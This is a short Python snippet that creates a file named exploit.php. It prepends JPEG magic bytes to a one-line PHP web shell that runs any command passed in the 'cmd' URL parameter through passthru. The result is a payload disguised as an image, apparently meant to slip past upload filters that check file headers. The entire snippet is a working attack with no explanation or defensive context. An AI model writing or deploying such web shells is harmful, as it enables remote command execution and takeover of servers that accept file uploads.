f = open('exploit.php', 'w')
f.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>') # This is the magic header for a JPEG image
f.close()
